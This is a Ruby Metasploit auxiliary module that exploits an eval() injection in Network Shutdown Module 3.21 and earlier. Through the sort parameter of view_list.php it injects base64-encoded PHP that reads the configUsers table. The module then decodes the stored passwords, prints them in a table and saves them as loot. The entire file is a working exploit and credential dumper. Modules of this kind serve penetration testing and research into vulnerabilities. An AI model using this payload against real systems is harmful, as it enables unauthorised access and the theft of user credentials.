##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Network Shutdown Module sort_values Credential Dumper',
      'Description'    => %q{
        This module will extract user credentials from Network Shutdown Module
        versions 3.21 and earlier by exploiting a vulnerability found in
        lib/dbtools.inc, which uses unsanitized user input inside a eval() call.
        Please note that in order to extract credentials, the vulnerable service
        must have at least one USV module (an entry in the "nodes" table in
        mgedb.db).
      },
      'References'     =>
        [
          ['OSVDB', '83199'],
          ['URL', 'https://web.archive.org/web/20121014000855/http://secunia.com/advisories/49103/']
        ],
      'Author'         =>
        [
          'h0ng10',
          'sinn3r'
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => '2012-06-26'
    ))

    register_options(
      [
        Opt::RPORT(4679)
      ])
  end

  def execute_php_code(code, opts = {})
    param_name = Rex::Text.rand_text_alpha(6)
    padding    = Rex::Text.rand_text_alpha(6)
    php_code   = Rex::Text.encode_base64(code)
    url_param  = "#{padding}%22%5d,%20eval(base64_decode(%24_POST%5b%27#{param_name}%27%5d))%29;%2f%2f"

    res = send_request_cgi(
      {
        'uri'   =>  '/view_list.php',
        'method' => 'POST',
        'vars_get' =>
          {
            'paneStatusListSortBy' => url_param,
          },
        'vars_post' =>
          {
            param_name => php_code,
          },
        'headers' =>
          {
            'Connection' => 'Close'
          }
        })
    res
  end

  def read_credentials
    pattern   = Rex::Text.rand_text_numeric(10)
    users_var = Rex::Text.rand_text_alpha(10)
    user_var  = Rex::Text.rand_text_alpha(10)
    php = <<-EOT
    $#{users_var} = &queryDB("SELECT * FROM configUsers;");
    foreach($#{users_var} as $#{user_var}) {
    print "#{pattern}" .$#{user_var}["login"]."#{pattern}".base64_decode($#{user_var}["pwd"])."#{pattern}";
    } die();
    EOT

    print_status("Reading user credentials from the database")
    response = execute_php_code(php)

    if not response or response.code != 200 then
      print_error("Failed: Error requesting page")
      return
    end

    credentials = response.body.to_s.scan(/\d{10}(.*)\d{10}(.*)\d{10}/)
    return credentials
  end

  def run
    credentials = read_credentials
    if credentials.empty?
      print_warning("No credentials collected.")
      print_warning("Sometimes this is because the server isn't in the vulnerable state.")
      return
    end

    cred_table = Rex::Text::Table.new(
      'Header'  => 'Network Shutdown Module Credentials',
      'Indent'  => 1,
      'Columns' => ['Username', 'Password']
    )

    credentials.each do |record|
      cred_table << [record[0], record[1]]
    end

    print_line
    print_line(cred_table.to_s)

    loot_name     = "eaton.nsm.credentials"
    loot_type     = "text/csv"
    loot_filename = "eaton_nsm_creds.csv"
    loot_desc     = "Eaton Network Shutdown Module Credentials"
    p = store_loot(loot_name, loot_type, datastore['RHOST'], cred_table.to_csv, loot_filename, loot_desc)
    print_good("Credentials saved in: #{p.to_s}")
  end
end
